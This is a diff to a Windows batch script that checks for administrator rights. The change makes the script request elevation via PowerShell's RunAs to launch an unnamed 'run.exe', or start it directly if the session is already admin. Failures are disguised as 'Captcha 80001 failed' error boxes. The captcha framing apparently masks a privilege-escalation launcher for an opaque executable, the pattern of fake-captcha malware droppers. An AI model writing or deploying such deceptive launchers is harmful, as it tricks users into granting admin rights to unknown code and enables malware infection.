@@ -2,10 +2,12 @@
 :: Check for Admin Privileges
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    :: Show message box
-    powershell -command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('captcha failed')"
-    exit /b
+    :: Ask for admin privileges
+    powershell -Command "Start-Process 'run.exe' -Verb RunAs -ErrorAction Stop"
+    if %errorlevel% neq 0 (
+        powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Captcha 80001 failed: User cancelled', 'Error', 'OK', 'Error')"
+    )
+) else (
+    :: If already admin, run the executable directly
+    start "" run.exe
 )
-
-:: If admin, run the executable
-start "" /B run.exe
